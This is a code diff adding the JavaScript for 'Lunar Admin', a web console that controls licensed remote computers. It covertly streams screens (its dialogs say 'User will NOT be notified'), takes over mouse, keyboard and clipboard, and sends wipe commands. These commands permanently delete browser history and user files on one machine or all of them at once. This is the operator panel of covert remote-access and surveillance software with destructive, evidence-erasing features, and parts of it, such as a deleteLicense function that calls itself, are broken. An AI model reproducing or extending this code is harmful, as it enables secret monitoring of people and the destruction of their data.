+async function loginDevice(deviceId, selectedLicense) {
+    const device = state.devices[deviceId];
+    if (!device) return;
+
+    let licenseKey = selectedLicense || safeText(device.license_key);
+    if (!licenseKey) {
+        const active = Object.keys(state.licenses).filter(k => state.licenses[k].is_active && licenseTimeLeft(state.licenses[k]).status !== 'expired');
+        if (active.length > 0) licenseKey = active[0];
+    }
+    if (!licenseKey) {
+        alert('No active license available.\n\nCreate or activate a license first.');
+        return;
+    }
+
+    const lic = state.licenses[licenseKey];
+    if (lic) {
+        if (!lic.is_active) { alert('Selected license is inactive.'); return; }
+        if (licenseTimeLeft(lic).status === 'expired') { alert('Selected license is expired.'); return; }
+    }
+
+    await sendDeviceCommand(deviceId, 'login', licenseKey);
+}
+
+async function logoutDevice(deviceId) {
+    await sendDeviceCommand(deviceId, 'logout', '');
+}
+
+async function wipeComputer(deviceId) {
+    const device = state.devices[deviceId];
+    if (!device) return;
+    const name = safeText(device.computer_name) || 'Unknown';
+
+    if (!confirm(`☠ WIPE COMPUTER — IRREVERSIBLE\n\nYou are about to PERMANENTLY DELETE everything on:\n\n  ${name}\n\nThis will remove:\n• Edge browser history (all time)\n• Chrome history + cache (all time)\n• Desktop files & folders\n• Downloads folder contents\n• Documents, Pictures, Videos, Music\n• Temp files\n\nFiles are NOT sent to Recycle Bin.\nThis CANNOT be undone.\n\nContinue?`)) return;
+    if (!confirm(`Final Confirmation\n\nReally wipe ${name}?\n\nThere is NO undo.`)) return;
+
+    await sendDeviceCommand(deviceId, 'wipe', '');
+    addLog(`☠ WIPE command sent → ${name}`);
+}
+
+async function loginAll() {
+    const ids = Object.keys(state.devices);
+    if (ids.length === 0) { alert('No online computers.'); return; }
+
+    const activeLicenses = Object.keys(state.licenses).filter(k => state.licenses[k].is_active && licenseTimeLeft(state.licenses[k]).status !== 'expired');
+    if (activeLicenses.length === 0) { alert('No active, non-expired license.'); return; }
+
+    const defaultLicense = activeLicenses[0];
+    if (!confirm(`LOGIN ALL\n\nSend LOGIN AUTO to ${ids.length} online computer(s)?\n\nLicense:\n${defaultLicense}`)) return;
+
+    for (const id of ids) {
+        await sendDeviceCommand(id, 'login', defaultLicense);
+        await new Promise(r => setTimeout(r, 250));
+    }
+    addLog(`LOGIN ALL queued for ${ids.length} devices`);
+}
+
+async function logoutAll() {
+    const ids = Object.keys(state.devices);
+    if (ids.length === 0) { alert('No online computers.'); return; }
+    if (!confirm(`LOGOUT ALL\n\nSend LOGOUT to ${ids.length} online computer(s)?`)) return;
+
+    for (const id of ids) {
+        await sendDeviceCommand(id, 'logout', '');
+        await new Promise(r => setTimeout(r, 250));
+    }
+    addLog(`LOGOUT ALL queued for ${ids.length} devices`);
+}
+
+async function wipeAllComputers() {
+    const ids = Object.keys(state.devices);
+    if (ids.length === 0) { alert('No online computers.'); return; }
+
+    if (!confirm(`☠ WIPE ALL COMPUTERS — IRREVERSIBLE\n\nYou are about to PERMANENTLY DELETE everything on ${ids.length} online computer(s).\n\nFiles are NOT sent to Recycle Bin.\nThis CANNOT be undone.\n\nContinue?`)) return;
+    if (!confirm(`Final Confirmation\n\nReally wipe ALL ${ids.length} computer(s)?\n\nThere is NO undo.`)) return;
+
+    for (const id of ids) {
+        await sendDeviceCommand(id, 'wipe', '');
+        await new Promise(r => setTimeout(r, 350));
+    }
+    addLog(`☠ WIPE ALL queued for ${ids.length} devices`);
+}
+
+// ==================== SCREEN VIEWER ====================
+let screenViewerState = {
+    deviceId: null,
+    computerName: '',
+    controlEnabled: false,
+    lastFrameId: -1,
+    refreshTimer: null,
+    pollTimer: null,
+    remoteW: 1920,
+    remoteH: 1080,
+    imageX: 0,
+    imageY: 0,
+    imageW: 0,
+    imageH: 0,
+};
+
+function openScreenViewer(deviceId) {
+    const device = state.devices[deviceId];
+    if (!device) { alert('Device not found.'); return; }
+    const name = safeText(device.computer_name) || 'Unknown Computer';
+
+    if (!confirm(`Start Screen View\n\nOpen live screen view for:\n\n${name}\n\nUser will NOT be notified.`)) return;
+
+    screenViewerState.deviceId = deviceId;
+    screenViewerState.computerName = name;
+    screenViewerState.controlEnabled = false;
+    screenViewerState.lastFrameId = -1;
+
+    document.getElementById('modalTitle').textContent = `🖥 ${name}`;
+    document.getElementById('modalStatus').textContent = '● LIVE — Waiting for first frame…';
+    document.getElementById('modalStatus').style.color = 'var(--lunar-text-muted)';
+    document.getElementById('viewerArea').innerHTML = `<div style="text-align:center"><i class="fas fa-spinner fa-spin" style="font-size:28px;margin-bottom:12px;display:block"></i>Waiting for first frame…</div>`;
+    document.getElementById('screenModal').classList.add('open');
+
+    // Enable screen view on device
+    setScreenView(deviceId, true).catch(e => console.error('Enable screen error:', e));
+
+    // Start refresh
+    if (screenViewerState.refreshTimer) clearInterval(screenViewerState.refreshTimer);
+    screenViewerState.refreshTimer = setInterval(downloadScreenFrame, 900);
+    downloadScreenFrame();
+
+    // Start clipboard poll
+    if (screenViewerState.pollTimer) clearInterval(screenViewerState.pollTimer);
+    screenViewerState.pollTimer = setInterval(pollClipboard, 1500);
+
+    // Attach input events
+    attachViewerInputEvents();
+}
+
+async function downloadScreenFrame() {
+    if (!screenViewerState.deviceId) return;
+    try {
+        const data = await supabaseFetch(
+            `${LUNAR_SUPABASE_URL}/rest/v1/lunar_devices?select=screen_storage_path,screen_frame_id,screen_view_active,screen_last_upload&device_id=eq.${encodeURIComponent(screenViewerState.deviceId)}`
+        );
+        const rows = Array.isArray(data) ? data : [];
+        if (rows.length === 0) return;
+        const row = rows[0];
+
+        if (!row.screen_view_active) {
+            document.getElementById('modalStatus').textContent = 'Stream stopped by server';
+            document.getElementById('modalStatus').style.color = 'var(--lunar-offline)';
+            return;
+        }
+
+        const path = safeText(row.screen_storage_path);
+        const frameId = row.screen_frame_id || 0;
+        if (!path) return;
+        if (frameId === screenViewerState.lastFrameId) return;
+
+        const url = `${LUNAR_SUPABASE_URL}/storage/v1/object/public/${LUNAR_SCREEN_BUCKET}/${path}?t=${Date.now()}`;
+        const img = new Image();
+        img.crossOrigin = 'anonymous';
+        img.onload = () => {
+            screenViewerState.remoteW = img.naturalWidth;
+            screenViewerState.remoteH = img.naturalHeight;
+            screenViewerState.lastFrameId = frameId;
+
+            const viewerArea = document.getElementById('viewerArea');
+            const areaW = viewerArea.clientWidth || 600;
+            const areaH = viewerArea.clientHeight || 300;
+
+            // Scale image to fit
+            const scale = Math.min(areaW / img.naturalWidth, areaH / img.naturalHeight);
+            const dispW = Math.round(img.naturalWidth * scale);
+            const dispH = Math.round(img.naturalHeight * scale);
+            screenViewerState.imageW = dispW;
+            screenViewerState.imageH = dispH;
+            screenViewerState.imageX = Math.round((areaW - dispW) / 2);
+            screenViewerState.imageY = Math.round((areaH - dispH) / 2);
+
+            viewerArea.innerHTML = '';
+            viewerArea.style.position = 'relative';
+            const canvas = document.createElement('canvas');
+            canvas.width = dispW;
+            canvas.height = dispH;
+            canvas.style.position = 'absolute';
+            canvas.style.left = screenViewerState.imageX + 'px';
+            canvas.style.top = screenViewerState.imageY + 'px';
+            canvas.style.width = dispW + 'px';
+            canvas.style.height = dispH + 'px';
+            canvas.style.borderRadius = '6px';
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(img, 0, 0, dispW, dispH);
+            viewerArea.appendChild(canvas);
+
+            document.getElementById('modalStatus').textContent = `● LIVE • ${formatTime(row.screen_last_upload)}`;
+            document.getElementById('modalStatus').style.color = 'var(--lunar-online)';
+        };
+        img.onerror = () => {
+            document.getElementById('modalStatus').textContent = 'Error loading frame';
+            document.getElementById('modalStatus').style.color = 'var(--lunar-offline)';
+        };
+        img.src = url;
+
+    } catch (e) {
+        console.error('Frame download error:', e);
+    }
+}
+
+function attachViewerInputEvents() {
+    const viewerArea = document.getElementById('viewerArea');
+    if (!viewerArea) return;
+
+    viewerArea.onmousemove = (e) => {
+        if (!screenViewerState.controlEnabled) return;
+        const rect = viewerArea.getBoundingClientRect();
+        const wx = e.clientX - rect.left;
+        const wy = e.clientY - rect.top;
+        const rx = Math.round((wx - screenViewerState.imageX) * screenViewerState.remoteW / screenViewerState.imageW);
+        const ry = Math.round((wy - screenViewerState.imageY) * screenViewerState.remoteH / screenViewerState.imageH);
+        if (rx >= 0 && ry >= 0 && rx < screenViewerState.remoteW && ry < screenViewerState.remoteH) {
+            sendInput(screenViewerState.deviceId, { mouse_x: rx, mouse_y: ry, action: 'move' }).catch(() => {});
+        }
+    };
+
+    viewerArea.onclick = (e) => {
+        if (!screenViewerState.controlEnabled) return;
+        const rect = viewerArea.getBoundingClientRect();
+        const wx = e.clientX - rect.left;
+        const wy = e.clientY - rect.top;
+        const rx = Math.round((wx - screenViewerState.imageX) * screenViewerState.remoteW / screenViewerState.imageW);
+        const ry = Math.round((wy - screenViewerState.imageY) * screenViewerState.remoteH / screenViewerState.imageH);
+        sendInput(screenViewerState.deviceId, { mouse_x: rx, mouse_y: ry, action: 'click', button: 'left' }).catch(() => {});
+    };
+
+    viewerArea.oncontextmenu = (e) => {
+        e.preventDefault();
+        if (!screenViewerState.controlEnabled) return;
+        const rect = viewerArea.getBoundingClientRect();
+        const wx = e.clientX - rect.left;
+        const wy = e.clientY - rect.top;
+        const rx = Math.round((wx - screenViewerState.imageX) * screenViewerState.remoteW / screenViewerState.imageW);
+        const ry = Math.round((wy - screenViewerState.imageY) * screenViewerState.remoteH / screenViewerState.imageH);
+        sendInput(screenViewerState.deviceId, { mouse_x: rx, mouse_y: ry, action: 'click', button: 'right' }).catch(() => {});
+    };
+
+    viewerArea.onwheel = (e) => {
+        e.preventDefault();
+        if (!screenViewerState.controlEnabled) return;
+        const rect = viewerArea.getBoundingClientRect();
+        const wx = e.clientX - rect.left;
+        const wy = e.clientY - rect.top;
+        const rx = Math.round((wx - screenViewerState.imageX) * screenViewerState.remoteW / screenViewerState.imageW);
+        const ry = Math.round((wy - screenViewerState.imageY) * screenViewerState.remoteH / screenViewerState.imageH);
+        const delta = Math.sign(e.deltaY);
+        sendInput(screenViewerState.deviceId, { mouse_x: rx, mouse_y: ry, action: 'scroll', scroll: delta }).catch(() => {});
+    };
+}
+
+function toggleControl() {
+    if (!screenViewerState.deviceId) return;
+    screenViewerState.controlEnabled = !screenViewerState.controlEnabled;
+    setControl(screenViewerState.deviceId, screenViewerState.controlEnabled).catch(e => console.error('Control toggle error:', e));
+
+    const btn = document.getElementById('modalToggleControl');
+    if (screenViewerState.controlEnabled) {
+        btn.innerHTML = '<i class="fas fa-stop-circle"></i> DISABLE REMOTE CONTROL';
+        btn.style.background = 'var(--lunar-accent-red)';
+    } else {
+        btn.innerHTML = '<i class="fas fa-gamepad"></i> ENABLE REMOTE CONTROL';
+        btn.style.background = 'var(--lunar-accent-purple)';
+    }
+}
+
+function modalSendClipboard() {
+    if (!screenViewerState.controlEnabled) { alert('Enable remote control first.'); return; }
+    const text = prompt('Text to set on the user\'s clipboard:');
+    if (!text) return;
+    sendClipboard(screenViewerState.deviceId, text, 'to_user').catch(e => alert('Clipboard error: ' + e.message));
+}
+
+function modalGetClipboard() {
+    if (!screenViewerState.controlEnabled) { alert('Enable remote control first.'); return; }
+    sendClipboard(screenViewerState.deviceId, '', 'request_from_user').catch(e => alert('Clipboard error: ' + e.message));
+}
+
+function modalSendText() {
+    if (!screenViewerState.controlEnabled) { alert('Enable remote control first.'); return; }
+    const text = prompt('Text to type on the remote screen:');
+    if (!text) return;
+    sendInput(screenViewerState.deviceId, { action: 'text', key_text: text }).catch(e => alert('Send error: ' + e.message));
+}
+
+async function pollClipboard() {
+    if (!screenViewerState.deviceId) return;
+    try {
+        const data = await supabaseFetch(
+            `${LUNAR_SUPABASE_URL}/rest/v1/lunar_devices?select=clipboard_text,clipboard_direction,clipboard_id&device_id=eq.${encodeURIComponent(screenViewerState.deviceId)}`
+        );
+        const rows = Array.isArray(data) ? data : [];
+        if (rows.length === 0) return;
+        const row = rows[0];
+        const clipId = row.clipboard_id || 0;
+        const direction = safeText(row.clipboard_direction);
+        const text = row.clipboard_text || '';
+        if (clipId > 0 && direction === 'to_admin') {
+            try { navigator.clipboard.writeText(text); } catch (e) { /* fallback */ }
+            document.getElementById('modalStatus').textContent = `📥 Received clipboard (${text.length} chars)`;
+            document.getElementById('modalStatus').style.color = 'var(--lunar-accent-cyan)';
+            setTimeout(() => {
+                document.getElementById('modalStatus').textContent = '● LIVE';
+                document.getElementById('modalStatus').style.color = 'var(--lunar-online)';
+            }, 4000);
+        }
+    } catch (e) { /* ignore */ }
+}
+
+function closeScreenViewer() {
+    if (screenViewerState.deviceId) {
+        setScreenView(screenViewerState.deviceId, false).catch(() => {});
+        setControl(screenViewerState.deviceId, false).catch(() => {});
+    }
+    if (screenViewerState.refreshTimer) clearInterval(screenViewerState.refreshTimer);
+    if (screenViewerState.pollTimer) clearInterval(screenViewerState.pollTimer);
+    screenViewerState.deviceId = null;
+    document.getElementById('screenModal').classList.remove('open');
+}
+
+// ==================== LICENSE ACTIONS ====================
+async function setLicenseActive(key, active) {
+    try {
+        await updateLicense(key, { is_active: active, updated_at: isoNow() });
+        addLog(`License ${active ? 'activated' : 'restricted'}: ${key}`);
+        if (!active) {
+            const matching = Object.values(state.devices).filter(d => safeText(d.license_key) === key);
+            for (const d of matching) {
+                await sendDeviceCommand(d.device_id, 'logout', '');
+            }
+        }
+        await refreshLunarData();
+    } catch (e) {
+        alert('License error: ' + e.message);
+    }
+}
+
+async function deleteLicense(key) {
+    if (!confirm(`Delete this license?\n\n${key}\n\nThis cannot be undone.`)) return;
+    try {
+        // Logout matching devices
+        const matching = Object.values(state.devices).filter(d => safeText(d.license_key) === key);
+        for (const d of matching) {
+            await updateDevice(d.device_id, {
+                license_key: null,
+                admin_command: 'logout',
+                admin_license_key: '',
+                command_id: makeCommandId(),
+                command_created_at: isoNow(),
+                command_status: 'pending',
+                command_message: 'License deleted',
+                updated_at: isoNow(),
+            });
+        }
+        await deleteLicense(key);
+        addLog('License deleted: ' + key);
+        await refreshLunarData();
+    } catch (e) {
+        alert('Delete error: ' + e.message);
+    }
+}
+
+function editLicense(key) {
+    const lic = state.licenses[key];
+    if (!lic) return;
+    openLicenseDialog('edit', lic);
+}
+
+async function removeExpiredLicenses() {
+    const expired = Object.keys(state.licenses).filter(k => licenseTimeLeft(state.licenses[k]).status === 'expired');
+    if (expired.length === 0) { alert('No expired licenses found.'); return; }
+    if (!confirm(`Delete ${expired.length} expired license(s)?\n\nThis cannot be undone.`)) return;
+    for (const key of expired) {
+        await deleteLicense(key);
+    }
+}
+
+function checkExpiredLicenses() {
+    for (const [key, lic] of Object.entries(state.licenses)) {
+        if (licenseTimeLeft(lic).status === 'expired' && !state.autoDeletedLicenses.has(key)) {
+            state.autoDeletedLicenses.add(key);
+            // Auto-disable
+            updateLicense(key, { is_active: false, updated_at: isoNow(), notes: 'Expired' }).catch(() => {});
+            addLog(`License expired: ${key}`);
+        }
+    }
+}
+
+// ==================== LICENSE DIALOG ====================
+let licenseDialogMode = 'create';
+let licenseDialogItem = null;
+
+function openLicenseDialog(mode, item) {
+    licenseDialogMode = mode;
+    licenseDialogItem = item || null;
+
+    const title = mode === 'create' ? 'Create License' : 'Edit License';
+    document.getElementById('licenseModalTitle').innerHTML = `<i class="fas fa-key"></i> ${title}`;
+    document.getElementById('licenseSaveBtn').textContent = mode === 'create' ? 'CREATE LICENSE' : 'SAVE CHANGES';
+
+    if (mode === 'edit' && item) {
+        document.getElementById('licenseModalKey').value = item.license_key || '';
+        document.getElementById('licenseModalKey').disabled = true;
+        if (item.expires_at) {
+            const d = new Date(item.expires_at);
+            const local = new Date(d.getTime() - d.getTimezoneOffset() * 60000);
+            document.getElementById('licenseExpiry').value = local.toISOString().slice(0, 16).replace('T', ' ');
+        } else {
+            document.getElementById('licenseExpiry').value = '';
+        }
+        document.getElementById('licenseNotes').value = item.notes || '';
+        document.getElementById('licenseActive').checked = item.is_active !== false;
+    } else {
+        document.getElementById('licenseModalKey').value = '';
+        document.getElementById('licenseModalKey').disabled = false;
+        document.getElementById('licenseNotes').value = '';
+        document.getElementById('licenseActive').checked = true;
+        autoGenerateLicense();
+        quickSetExpiry(24);
+    }
+
+    document.getElementById('licenseModal').classList.add('open');
+}
+
+function closeLicenseDialog() {
+    document.getElementById('licenseModal').classList.remove('open');
+}
+
+function autoGenerateLicense() {
+    const prefix = document.getElementById('licensePrefix').value;
+    const groups = document.getElementById('licenseGroups').value;
+    const len = document.getElementById('licenseLen').value;
+    document.getElementById('licenseModalKey').value = generateLicenseKey(prefix, groups, len);
+}
+
+function quickSetExpiry(hours) {
+    const target = new Date(Date.now() + hours * 3600 * 1000);
+    const local = new Date(target.getTime() - target.getTimezoneOffset() * 60000);
+    document.getElementById('licenseExpiry').value = local.toISOString().slice(0, 16).replace('T', ' ');
+}
+
+async function saveLicense() {
+    const key = document.getElementById('licenseModalKey').value.trim();
+    if (!key) { alert('License key cannot be empty.'); return; }
+
+    let expiresIso;
+    try {
+        expiresIso = parseUserDateTime(document.getElementById('licenseExpiry').value);
+    } catch (e) {
+        alert('Expiry error: ' + e.message);
+        return;
+    }
+
+    const notes = document.getElementById('licenseNotes').value.trim();
+    const active = document.getElementById('licenseActive').checked;
+
+    if (licenseDialogMode === 'create') {
+        try {
+            await createLicense({
+                license_key: key,
+                is_active: active,
+                notes: notes || 'Created by Lunar Admin',
+                expires_at: expiresIso,
+                created_at: isoNow(),
+                updated_at: isoNow(),
+            });
+            addLog('License created: ' + key);
+            closeLicenseDialog();
+            await refreshLunarData();
+        } catch (e) {
+            alert('License creation error: ' + e.message);
+        }
+    } else {
+        try {
+            await updateLicense(key, {
+                is_active: active,
+                notes: notes,
+                expires_at: expiresIso,
+                updated_at: isoNow(),
+            });
+            addLog('License updated: ' + key);
+            closeLicenseDialog();
+            await refreshLunarData();
+        } catch (e) {
+            alert('License update error: ' + e.message);
+        }
+    }
+}
+
+// ==================== LOG ====================
+function addLog(message) {
+    console.log('[LUNAR]', message);
+    const tabContent = document.getElementById('tabContent');
+    let logContainer = document.getElementById('lunarLogContainer');
+    if (!logContainer) {
+        // Create log container in lunar panel if not present
+        const panel = document.getElementById('lunarPanel');
+        if (panel) {
+            logContainer = document.createElement('div');
+            logContainer.id = 'lunarLogContainer';
+            logContainer.className = 'log-container';
+            logContainer.style.marginTop = '16px';
+            logContainer.style.maxHeight = '200px';
+            panel.appendChild(logContainer);
+        }
+    }
+    if (logContainer) {
+        const line = document.createElement('div');
+        line.className = 'log-line';
+        const time = new Date().toLocaleTimeString();
+        line.innerHTML = `<span class="time">[${time}]</span>${message}`;
+        logContainer.appendChild(line);
+        logContainer.scrollTop = logContainer.scrollHeight;
+    }
+}
+
+// ==================== TAB SWITCHING ====================
+function switchTab(tabId) {
+    document.querySelectorAll('.tab-bar .tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+    document.querySelector(`.tab-bar .tab[data-tab="${tabId}"]`).classList.add('active');
+    document.getElementById(`pane-${tabId}`).classList.add('active');
+}
+
+// ==================== INITIALIZATION ====================
+document.addEventListener('DOMContentLoaded', () => {
+    // Login gate
+    initLoginGate();
+
+    document.getElementById('loginBtn').addEventListener('click', attemptLogin);
+    document.getElementById('licenseInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') attemptLogin();
+    });
+    document.getElementById('exitBtn').addEventListener('click', () => {
+        window.close();
+        document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;color:#64748b;font-family:Inter,sans-serif;font-size:18px">Lunar Admin closed.</div>';
+    });
+
+    // Console
+    document.getElementById('logoutBtn').addEventListener('click', logout);
+    document.getElementById('addDbBtn').addEventListener('click', () => switchTab('adddb'));
+    document.getElementById('saveProjectsBtn').addEventListener('click', () => alert('Projects saved locally.'));
+    document.getElementById('openLunarBtn').addEventListener('click', () => switchTab('lunar'));
+
+    // Tabs
+    document.querySelectorAll('.tab-bar .tab').forEach(tab => {
+        tab.addEventListener('click', () => switchTab(tab.dataset.tab));
+    });
+
+    // Lunar actions
+    document.getElementById('showAllScreensBtn').addEventListener('click', () => {
+        const ids = Object.keys(state.devices);
+        if (ids.length === 0) { alert('No online computers.'); return; }
+        if (!confirm(`Open live screen viewers for ${ids.length} online computer(s)?\n\nEach window can be independently maximized, minimized, or closed.\n\nUser will NOT be notified.`)) return;
+        for (const id of ids) {
+            setScreenView(id, true).catch(() => {});
+        }
+        alert(`${ids.length} screen viewers requested. Open each device card to view.`);
+    });
+
+    document.getElementById('closeAllScreensBtn').addEventListener('click', () => {
+        for (const id of Object.keys(state.screenWindows)) {
+            if (state.screenWindows[id]) {
+                try { state.screenWindows[id].close(); } catch (e) {}
+            }
+        }
+        state.screenWindows = {};
+        alert('All screen viewers closed.');
+    });
+
+    document.getElementById('loginAllBtn').addEventListener('click', loginAll);
+    document.getElementById('logoutAllBtn').addEventListener('click', logoutAll);
+    document.getElementById('wipeAllBtn').addEventListener('click', wipeAllComputers);
+    document.getElementById('refreshLunarBtn').addEventListener('click', () => { refreshLunarData(); });
+
+    document.getElementById('createLicenseBtn').addEventListener('click', () => openLicenseDialog('create'));
+    document.getElementById('removeExpiredBtn').addEventListener('click', removeExpiredLicenses);
+
+    // Add DB tab
+    document.getElementById('testSaveBtn').addEventListener('click', async () => {
+        const name = document.getElementById('addName').value.trim();
+        const pid = document.getElementById('addPid').value.trim();
+        const url = document.getElementById('addUrl').value.trim();
+        const skey = document.getElementById('addSkey').value.trim();
+        const akey = document.getElementById('addAkey').value.trim();
+
+        if (!url) { document.getElementById('addStatus').textContent = '❌ URL required'; return; }
+        if (!skey && !akey) { document.getElementById('addStatus').textContent = '❌ Service key or Anon key required'; return; }
+
+        document.getElementById('addStatus').textContent = '⏳ Testing…';
+        try {
+            const testUrl = url.startsWith('http') ? url : 'https://' + url;
+            const r = await fetch(`${testUrl.replace(/\/$/, '')}/rest/v1/extractor_sources?select=source_id&limit=1`, {
+                headers: { 'apikey': skey || akey, 'Authorization': `Bearer ${skey || akey}` }
+            });
+            if (!r.ok) throw new Error(`HTTP ${r.status}`);
+            document.getElementById('addStatus').textContent = '✅ Connection OK — saved locally.';
+            alert(`Project "${name || pid || url}" saved.`);
+        } catch (e) {
+            if (confirm(`Connection failed: ${e.message}\n\nSave anyway?`)) {
+                document.getElementById('addStatus').textContent = '⚠ Saved (connection failed).';
+            } else {
+                document.getElementById('addStatus').textContent = '❌ Connection failed.';
+            }
+        }
+    });
+
+    document.getElementById('clearAddBtn').addEventListener('click', () => {
+        ['addName', 'addPid', 'addUrl', 'addSkey', 'addAkey'].forEach(id => document.getElementById(id).value = '');
+        document.getElementById('addStatus').textContent = '';
+    });
+
+    // Screen modal
+    document.getElementById('modalClose').addEventListener('click', closeScreenViewer);
+    document.getElementById('modalToggleControl').addEventListener('click', toggleControl);
+    document.getElementById('modalSendClipboard').addEventListener('click', modalSendClipboard);
+    document.getElementById('modalGetClipboard').addEventListener('click', modalGetClipboard);
+    document.getElementById('modalSendText').addEventListener('click', modalSendText);
+
+    document.getElementById('screenModal').addEventListener('click', (e) => {
+        if (e.target === e.currentTarget) closeScreenViewer();
+    });
+
+    // License modal
+    document.getElementById('licenseModalClose').addEventListener('click', closeLicenseDialog);
+    document.getElementById('licenseCancelBtn').addEventListener('click', closeLicenseDialog);
+    document.getElementById('licenseSaveBtn').addEventListener('click', saveLicense);
+    document.getElementById('licenseGenerateBtn').addEventListener('click', autoGenerateLicense);
+    document.getElementById('licenseRandomBtn').addEventListener('click', () => {
+        const prefixes = ['LUNAR', 'STAR', 'NOVA', 'ORBIT', 'MOON', 'COMET'];
+        document.getElementById('licensePrefix').value = prefixes[Math.floor(Math.random() * prefixes.length)];
+        document.getElementById('licenseGroups').value = [3, 4, 5][Math.floor(Math.random() * 3)];
+        document.getElementById('licenseLen').value = [4, 5, 6, 8][Math.floor(Math.random() * 4)];
+        autoGenerateLicense();
+    });
+
+    document.querySelectorAll('.quick-expiry').forEach(btn => {
+        btn.addEventListener('click', () => quickSetExpiry(parseInt(btn.dataset.hours)));
+    });
+
+    document.getElementById('licenseModal').addEventListener('click', (e) => {
+        if (e.target === e.currentTarget) closeLicenseDialog();
+    });
+
+    // Keyboard shortcut for screen modal
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+            if (document.getElementById('screenModal').classList.contains('open')) closeScreenViewer();
+            if (document.getElementById('licenseModal').classList.contains('open')) closeLicenseDialog();
+        }
+    });
+
+    // Periodic UI refresh for license countdowns
+    setInterval(() => {
+        if (state.loggedIn) {
+            renderLicenses();
+        }
+    }, 10000);
+});
+
+// Expose globals for inline onclick handlers
+window.toggleDevice = toggleDevice;
+window.toggleLicense = toggleLicense;
+window.openScreenViewer = openScreenViewer;
+window.wipeComputer = wipeComputer;
+window.loginDevice = loginDevice;
+window.logoutDevice = logoutDevice;
+window.setLicenseActive = setLicenseActive;
+window.deleteLicense = deleteLicense;
+window.editLicense = editLicense;
+window.closeScreenViewer = closeScreenViewer;
+window.toggleControl = toggleControl;
+window.modalSendClipboard = modalSendClipboard;
+window.modalGetClipboard = modalGetClipboard;
+window.modalSendText = modalSendText;
+window.switchTab = switchTab;
+window.addLog = addLog;
+</script>
+</body>
+</html>
